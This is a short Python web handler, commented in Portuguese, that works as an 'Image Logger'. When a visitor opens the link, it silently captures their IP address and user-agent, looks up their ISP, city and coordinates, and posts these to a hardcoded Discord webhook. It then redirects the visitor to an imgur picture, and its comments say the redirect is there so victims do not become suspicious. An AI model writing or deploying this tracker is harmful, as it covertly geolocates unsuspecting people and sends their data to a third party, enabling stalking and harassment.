from http.server import BaseHTTPRequestHandler
import requests, json

class handler(BaseHTTPRequestHandler):
    def do_GET(self):
        try:
            ip = self.headers.get('x-forwarded-for', self.client_address[0])
            ua = self.headers.get('user-agent', 'Unknown')
            
            # Pega info do IP
            r = requests.get(f"http://ip-api.com/json/{ip}?fields=status,isp,as,country,regionName,city,lat,lon,timezone", timeout=10)
            info = r.json()
            
            # Envia pro Discord
            webhook_url = "https://discord.com/api/webhooks/1529826199344250971/FhwVCzzEGAHh5a7RiLQC6-vseaAWJDQMiLPwml07pFwCoCKX8njGhfU9HDWc_hh6e57g"
            
            embed = {
                "username": "Image Logger",
                "embeds": [{
                    "title": "🎯 IP Capturado!",
                    "color": 0xFF0000,
                    "description": (
                        f"**IP:** `{ip}`\n"
                        f"**ISP:** `{info.get('isp', '?')}`\n"
                        f"**ASN:** `{info.get('as', '?')}`\n"
                        f"**País:** `{info.get('country', '?')}`\n"
                        f"**Região:** `{info.get('regionName', '?')}`\n"
                        f"**Cidade:** `{info.get('city', '?')}`\n"
                        f"**Coords:** `{info.get('lat', '?')}, {info.get('lon', '?')}`\n"
                        f"**Fuso:** `{info.get('timezone', '?')}`\n"
                        f"**User-Agent:** `{ua[:100]}`\n"
                    ),
                    "thumbnail": {"url": "https://i.imgur.com/3i3UjfE.jpg"}
                }]
            }
            
            requests.post(webhook_url, json=embed, timeout=10)
            
            # Redireciona pra imagem real (pra pessoa ver a foto)
            self.send_response(302)
            self.send_header('Location', 'https://i.imgur.com/3i3UjfE.jpg')
            self.end_headers()
            
        except Exception as e:
            print(f"Erro: {e}")
            # Se der erro, redireciona mesmo assim pra não desconfiarem
            self.send_response(302)
            self.send_header('Location', 'https://i.imgur.com/3i3UjfE.jpg')
            self.end_headers()
